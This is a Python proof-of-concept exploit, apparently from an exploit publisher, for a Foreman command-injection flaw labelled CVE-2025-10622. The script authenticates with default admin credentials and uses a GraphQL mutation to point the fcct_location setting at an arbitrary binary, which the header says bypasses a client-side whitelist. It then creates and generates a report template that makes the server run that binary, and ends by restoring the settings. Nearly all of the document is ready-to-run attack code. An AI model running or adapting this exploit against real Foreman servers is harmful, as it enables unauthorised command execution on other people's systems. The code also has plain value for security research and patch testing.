#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Foreman OS Command Injection (GraphQL Variant)
# CVE            : CVE-2025-10622
# Vendor         : The Foreman Project / Red Hat
# Product        : Foreman
# Affected       : 3.12.0 through 3.16.0 (inclusive)
# Type           : CWE-78 / CWE-602
# CVSS           : 8.0 (High)
# Platform       : Ruby / Rails / GraphQL
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Variant for CVE-2025-10622: Foreman OS Command Injection via fcct_location + GraphQL

This variant demonstrates:
  1. The SECOND vulnerable setting (fcct_location for Fedora CoreOS transpiler)
  2. Exploitation via GraphQL mutation (alternative to REST API)
  3. Triggering via transpile_fedora_coreos_config() macro

This proves that both ct_location AND fcct_location are vulnerable, and
that the bypass works through both REST API and GraphQL interfaces.

Usage:
  python3 poc_fcct_graphql.py <target_host> [port] [username] [password]
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import time

DEFAULT_HOST = "172.22.0.5"
DEFAULT_PORT = 3000
DEFAULT_USER = "admin"
DEFAULT_PASS = "changeme"

ORIGINAL_FCCT_LOCATION = "/usr/bin/fcct"


def print_banner(target):
    """Print exploit run banner."""
    print("=" * 78)
    print("  CVE-2025-10622: Foreman OS Command Injection (fcct_location + GraphQL)")
    print("  Exploit Intelligence Platform | exploit-intel.com")
    print("=" * 78)
    print(f"Target:  {target}")
    print("=" * 78)


class ForemanGraphQLExploit:
    """CVE-2025-10622 variant: fcct_location via GraphQL mutation."""

    def __init__(self, host, port, username, password):
        self.base_url = f"http://{host}:{port}"
        self.username = username
        self.password = password
        self.auth_header = self._make_auth_header(username, password)
        self.template_id = None

    @staticmethod
    def _make_auth_header(username, password):
        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
        return f"Basic {credentials}"

    def _api_request(self, method, path, data=None):
        url = f"{self.base_url}{path}"
        headers = {
            "Authorization": self.auth_header,
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        body = json.dumps(data).encode("utf-8") if data else None
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                response_body = resp.read().decode("utf-8")
                content_type = resp.headers.get("Content-Type", "")
                if "json" in content_type:
                    return resp.status, json.loads(response_body)
                return resp.status, response_body
        except urllib.error.HTTPError as e:
            response_body = e.read().decode("utf-8")
            try:
                return e.code, json.loads(response_body)
            except json.JSONDecodeError:
                return e.code, response_body
        except Exception as e:
            print(f"[!] Error: {e}")
            return None, None

    def _graphql_request(self, query, variables=None):
        """Make a GraphQL request to Foreman."""
        url = f"{self.base_url}/api/graphql"
        headers = {
            "Authorization": self.auth_header,
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        body = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            response_body = e.read().decode("utf-8")
            try:
                return json.loads(response_body)
            except json.JSONDecodeError:
                return {"errors": [{"message": response_body}]}
        except Exception as e:
            return {"errors": [{"message": str(e)}]}

    def exploit(self):
        """Run the full fcct_location + GraphQL exploit chain."""
        print_banner(self.base_url)

        # Step 0: Verify target
        print("\n[*] Step 0: Checking target...")
        status, data = self._api_request("GET", "/api/v2/status")
        if status != 200:
            print(f"[!] Target not reachable (HTTP {status})")
            return False
        print(f"[+] Foreman {data.get('version', '?')} detected")

        # Step 1: Read current fcct_location
        print("\n[*] Step 1: Reading current fcct_location setting...")
        status, data = self._api_request("GET", "/api/v2/settings/fcct_location")
        if status == 200:
            print(f"    Current value: {data.get('value', '?')}")
            whitelist = data.get("select_values", {})
            print(f"    Client-side whitelist: {list(whitelist.keys())}")

        # Step 2: Set fcct_location via GraphQL mutation
        print("\n[*] Step 2: Setting fcct_location to '/usr/bin/id' via GraphQL mutation...")
        mutation = """
        mutation {
          updateSetting(input: {name: "fcct_location", value: "/usr/bin/id"}) {
            setting {
              name
              value
            }
            errors {
              path
              message
            }
          }
        }
        """
        result = self._graphql_request(mutation)

        if "errors" in result and result["errors"]:
            print(f"    [!] GraphQL errors: {result['errors']}")
            return False

        setting_data = result.get("data", {}).get("updateSetting", {})
        if setting_data.get("errors"):
            print(f"    [-] Mutation errors: {setting_data['errors']}")
            return False

        setting_value = setting_data.get("setting", {}).get("value", "unknown")
        print(f"    [+] fcct_location set to '{setting_value}' via GraphQL")
        print(f"    [+] GraphQL mutation bypassed client-side whitelist!")

        # Step 2b: Clear fcct_arguments to prevent flag conflicts with our binary
        print("\n[*] Step 2b: Clearing fcct_arguments to avoid flag conflicts...")
        status, args_data = self._api_request("GET", "/api/v2/settings/fcct_arguments")
        self.original_fcct_args = args_data.get("value", []) if status == 200 else []
        if self.original_fcct_args:
            print(f"    Current fcct_arguments: {self.original_fcct_args}")
            self._api_request(
                "PUT",
                "/api/v2/settings/fcct_arguments",
                {"setting": {"value": []}},
            )
            print(f"    [+] Cleared fcct_arguments")
        else:
            print(f"    [*] fcct_arguments already empty")

        # Step 3: Create trigger template with transpile_fedora_coreos_config
        print("\n[*] Step 3: Creating template with transpile_fedora_coreos_config()...")
        template_code = '<%= transpile_fedora_coreos_config("---\\ntest: true") %>'
        payload = {
            "report_template": {
                "name": f"CVE-2025-10622-FCCT-{int(time.time())}",
                "template": template_code,
            }
        }
        status, data = self._api_request("POST", "/api/v2/report_templates", payload)
        if not (status in (200, 201) or (isinstance(data, dict) and "id" in data)):
            print(f"    [!] Failed to create template: HTTP {status}")
            return False
        self.template_id = data["id"]
        print(f"    [+] Template created (ID: {self.template_id})")

        # Step 4: Trigger execution
        print("\n[*] Step 4: Generating template to trigger fcct command execution...")
        status, data = self._api_request(
            "POST", f"/api/v2/report_templates/{self.template_id}/generate", {}
        )

        if status == 200:
            output = data if isinstance(data, str) else json.dumps(data)
            print(f"\n    {'=' * 50}")
            print(f"    COMMAND OUTPUT:")
            print(f"    {'=' * 50}")
            for line in output.strip().split("\n"):
                print(f"    | {line}")
            print(f"    {'=' * 50}")
            print(f"\n[+] EXPLOIT SUCCESSFUL via fcct_location + GraphQL!")
        else:
            print(f"    [!] Failed: HTTP {status}")
            output = None

        # Cleanup
        print(f"\n[*] Cleanup...")
        if self.template_id:
            self._api_request("DELETE", f"/api/v2/report_templates/{self.template_id}")
            print(f"    [+] Deleted template")
        # Restore via GraphQL too
        restore_mutation = f"""
        mutation {{
          updateSetting(input: {{name: "fcct_location", value: "{ORIGINAL_FCCT_LOCATION}"}}) {{
            setting {{ name value }}
          }}
        }}
        """
        self._graphql_request(restore_mutation)
        print(f"    [+] Restored fcct_location to '{ORIGINAL_FCCT_LOCATION}'")
        # Restore fcct_arguments
        if hasattr(self, "original_fcct_args") and self.original_fcct_args:
            self._api_request(
                "PUT",
                "/api/v2/settings/fcct_arguments",
                {"setting": {"value": self.original_fcct_args}},
            )
            print(f"    [+] Restored fcct_arguments to {self.original_fcct_args}")

        return output is not None


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USER
    password = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_PASS

    exploit = ForemanGraphQLExploit(host, port, username, password)
    success = exploit.exploit()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
